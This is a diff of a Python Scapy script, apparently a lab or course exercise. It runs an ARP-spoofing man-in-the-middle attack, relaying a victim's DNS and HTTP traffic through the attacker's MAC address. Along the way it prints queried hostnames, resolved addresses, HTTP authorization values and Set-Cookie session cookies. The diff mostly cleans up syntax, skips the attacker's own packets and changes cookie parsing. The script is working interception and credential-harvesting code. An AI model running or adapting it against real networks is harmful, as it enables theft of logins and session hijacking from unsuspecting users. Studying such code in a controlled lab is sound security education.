@@ -57,28 +57,30 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
 # TODO: handle intercepted packets
 def interceptor(packet):
 	global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
-	if(packet.haslayer(IP)):
+	if packet[Ether].src == attackerMAC:
+		return
+	if packet.haslayer(IP):
 		# DNS request
-		if(packet[IP].src == clientIP and packet[IP].dst == dnsServerIP):
-			if(packet.haslayer(DNS)):
-				if(packet[DNS].rd == 1):
-					if(packet[DNS].qd is not None):
+		if packet[IP].src == clientIP and packet[IP].dst == dnsServerIP:
+			if packet.haslayer(DNS):
+				if packet[DNS].rd == 1:
+					if packet[DNS].qd is not None:
 						hostname = ''.join(chr(i) for i in packet[DNS].qd.qname)
 						print(f"*hostname: {hostname}")
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = dnsServerMAC
 			sendp(packet)
 		# DNS reply
-		elif(packet[IP].src == dnsServerIP and packet[IP].dst == clientIP):
-			if(packet.haslayer(DNS)):
-				if(packet[DNS].an is not None):
+		elif packet[IP].src == dnsServerIP and packet[IP].dst == clientIP:
+			if packet.haslayer(DNS):
+				if packet[DNS].an is not None:
 					print(f"*hostaddr: {packet[DNS].an.rdata}")
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = clientMAC
 			sendp(packet)
 		# HTTP request
-		elif(packet[IP].src == clientIP and packet[IP].dst == httpServerIP):
-			if(packet.haslayer(Raw)):
+		elif packet[IP].src == clientIP and packet[IP].dst == httpServerIP:
+			if packet.haslayer(Raw):
 				sub = packet[Raw].load.decode('utf-8').split()
 				auth = ''
 				for index, col in enumerate(sub):
@@ -91,13 +93,13 @@ def interceptor(packet):
 			packet[Ether].dst = httpServerMAC
 			sendp(packet)
 		# HTTP reply
-		elif(packet[IP].src == httpServerIP and packet[IP].dst == clientIP):
-			if(packet.haslayer(Raw)):
+		elif packet[IP].src == httpServerIP and packet[IP].dst == clientIP:
+			if packet.haslayer(Raw):
 				sub = packet[Raw].load.decode('utf-8').split()
 				cookie = ''
 				for index, col in enumerate(sub):
 					if col == 'Set-Cookie:':
-						cookie = sub[index+1].split('=')[1]
+						cookie = sub[index+1]
 						break
 				print(f"*cookie: {cookie}")
 			packet[Ether].src = attackerMAC
